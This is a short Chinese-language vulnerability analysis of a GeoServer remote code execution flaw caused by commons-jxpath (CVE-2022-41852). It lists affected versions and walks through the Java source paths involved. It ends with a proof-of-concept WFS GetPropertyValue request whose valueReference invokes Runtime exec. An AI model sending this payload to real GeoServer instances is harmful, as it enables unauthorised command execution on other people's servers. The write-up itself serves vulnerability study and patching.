#GeoServer #Commons-Jxpath
## 影响范围
- GeoServer < 2.23.6
- 2.24.0 <= GeoServer < 2.24.4
- 2.25.0 <= GeoServer < 2.25.2

## 漏洞成因
调用commons-jxpath 1.3 导致命令执行 commons-jxpath漏洞编号CVE-2022-41852

## 漏洞分析
在`org/geoserver/wfs/GetPropertyValue.java`第99行geotool的evaluate方法

```JAVA
try {  
  
    PropertyName propertyName =  
            filterFactory.property(request.getValueReference(), getNamespaceSupport());  
    PropertyName propertyNameNoIndexes =  
            filterFactory.property(  
                    request.getValueReference().replaceAll("\\[.*\\]", ""),  
                    getNamespaceSupport());  
    AttributeDescriptor descriptor =  
            (AttributeDescriptor)  
                    propertyNameNoIndexes.evaluate(featureType.getFeatureType());  
    boolean featureIdRequest =  
            FEATURE_ID_PATTERN.matcher(request.getValueReference()).matches();  
    if (descriptor == null && !featureIdRequest) {  
        throw new WFSException(  
                request, "No such attribute: " + request.getValueReference());  
    }  
  
    // create value collection type from feature collection  
    ValueCollectionType vc = Wfs20Factory.eINSTANCE.createValueCollectionType();  
    vc.setTimeStamp(fc.getTimeStamp());  
    vc.setNumberMatched(fc.getNumberMatched());  
    vc.setNumberReturned(fc.getNumberReturned());  
    vc.getMember()  
            .add(  
                    new PropertyValueCollection(  
                            fc.getMember().iterator().next(), descriptor, propertyName));  
    return vc;  
} catch (IOException e) {  
    throw new WFSException(request, e);  
}
```


在`org/geotools/filter/AttributeExpressionImpl.java`调用了漏洞api`FeaturePropertyAccessorFactory.FeaturePropertyAccessor#get()`

```JAVA
if (accessors != null) {  
    for (PropertyAccessor propertyAccessor : accessors) {  
        accessor = propertyAccessor;  
        try {  
            value = accessor.get(obj, attPath, target);  
            success = true;  
            break;  
        } catch (Exception e) {  
            // fine, we'll try another accessor  
            if (exceptions == null) {  
                exceptions = new ArrayList<>();  
            }  
            exceptions.add(e);  
        }  
    }  
}
```

![](attachments/Pasted%20image%2020241013162054.png)

![](attachments/Pasted%20image%2020241013162448.png)

## POC
```shell
GET /geoserver/wfs?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames=sf:archsites&valueReference=exec(java.lang.Runtime.getRuntime(),'cmd')
```
